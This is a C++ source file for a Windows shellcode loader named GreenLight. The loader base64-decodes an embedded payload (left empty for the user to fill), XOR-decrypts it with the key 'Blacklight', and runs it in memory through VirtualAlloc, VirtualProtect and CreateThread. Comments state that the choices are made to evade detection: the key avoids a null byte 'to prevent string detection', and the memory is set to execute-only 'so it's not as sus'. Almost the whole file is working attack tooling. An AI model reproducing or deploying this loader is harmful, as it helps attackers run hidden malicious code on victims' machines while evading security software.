// GreenLight.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "windows.h"
#include <string>
#include "base64.h"
#include <iostream>

using std::string;
using std::cout;
using std::endl;

// GLOBALS
bool DEBUG_MODE = false;

// METHOD HEADERS
void debug(string);
void debug(char*);
unsigned char* decryptXOR(unsigned char*, size_t);
unsigned char* decryptKey(unsigned char*, size_t);

// MAIN TO KICK OFF EVERYTHING
int main(int argc, char** argv)
{
	// TODO: PUT YOUR CODE HERE
	string encodedBytes = "";
	size_t bytesLength = encodedBytes.length();

	// HANDLE ARGUMENTS
	cout << argc << endl;
	for (size_t i = 0; i < argc; i++) {
		cout << i << ": " << argv[i] << endl;
	}
	if (argc == 2) {
		if(argv[1] == "debug") {
			DEBUG_MODE = true;
		}
	}

	// DECODE AND DECRYPT
	debug("Decoding sc...");
	string decodedBytes = base64_decode(encodedBytes);
	debug("Finished decoding! Decrypting...");
	unsigned char* encryptedBytes = (unsigned char*) decodedBytes.c_str();
	unsigned char* decryptedBytes = decryptKey(encryptedBytes, bytesLength);
	debug("Finished decrypting! Running...");

	// ALLOCATE MEMORY IN READ-WRITE MODE
	LPVOID startAddress = VirtualAlloc(NULL, bytesLength, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (!startAddress) {
		debug("Error! couldn't allocate memory");
		exit(1);
	}
	else {
		debug("Successfully allocated memory!");
	}

	// COPY MEMORY
	RtlMoveMemory(startAddress, decryptedBytes, bytesLength);

	// PROTECT MEMORY TO EXECUTE-ONLY SO IT'S NOT AS SUS
	DWORD oldProtect;
	BOOL success = VirtualProtect(startAddress, bytesLength, PAGE_EXECUTE, &oldProtect);
	if (!success) {
		debug("Error! Couldn't re-protect memory");
		exit(2);
	}
	else {
		debug("Successfully protected memory!");
	}

	// CREATE THREAD
	HANDLE threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)startAddress, NULL, 0, 0);
	
	// WAIT FOR IT TO FINISH
	WaitForSingleObject(threadHandle, INFINITE);

	return 0;

}


unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {

	debug("Decrypting with bytewise XOR");
	const unsigned char xKey = 35;

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	for (size_t i = 0; i < length; i++) {
		decrData[i] = encryptedBytes[i] ^ xKey;
	}
	decrData[length] = '\x00';
	debug("Finished decryption");
	return decrData;
}

// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {

	debug("Decrypting with key");

	// NO NULL BYTE TO PREVENT STRING DETECTION
	// KEY AND KEY LENGTH
	char key[] = { 'B', 'l', 'a', 'c', 'k', 'l', 'i', 'g', 'h', 't' };
	size_t keyLength = 10;

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	// i IS THE INDEX IN THE SC
	// j IS THE INDEX IN THE KEY
	size_t j = 0;
	for (size_t i = 0; i < length; i++) {

		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
		if (j == keyLength) {
			j = 0;
		}
		decrData[i] = encryptedBytes[i] ^ (unsigned char)key[j];
		j++;
	}
	decrData[length] = '\x00';
	debug("Finished decrypting!");
	return decrData;
}

void debug(string s) {
	if (DEBUG_MODE) cout << s << endl;
}

void debug(char* s) {
	if (DEBUG_MODE) cout << s << endl;
}